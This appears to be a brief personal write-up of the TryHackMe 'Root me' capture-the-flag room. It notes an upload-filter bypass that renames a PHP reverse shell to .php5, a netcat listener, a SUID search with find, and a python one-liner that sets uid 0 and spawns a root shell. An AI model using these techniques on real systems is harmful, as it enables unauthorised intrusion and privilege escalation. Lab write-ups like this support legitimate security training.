# Root me `ris:Computer`
Names | Details
--------|-----
Source | tryhackme
Level     | easy
Os | linux

**Notes :**




## Gaining Access `ris:User`

- PHP reverse shell uploaded as .php5 extesion
- netcat to listen on port



## Maintaining Access `ris:Admin`
- SUID Permission
	- /usr/bin/python


## Important commands `ris:Command`
- find / -perm /4000
	- `/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'`

## Post Exploitation `ris:CheckboxMultiple`
- User flag : /home/user
- Root flag : /root/root
## Tips `ris:EmotionHappy`
- it's possible to bypass .php Extesions filter by renaming it as .php5
- used python script for privilege escalation 


--------------------------------
**By Nibras Muhammed** 🤓🖥️






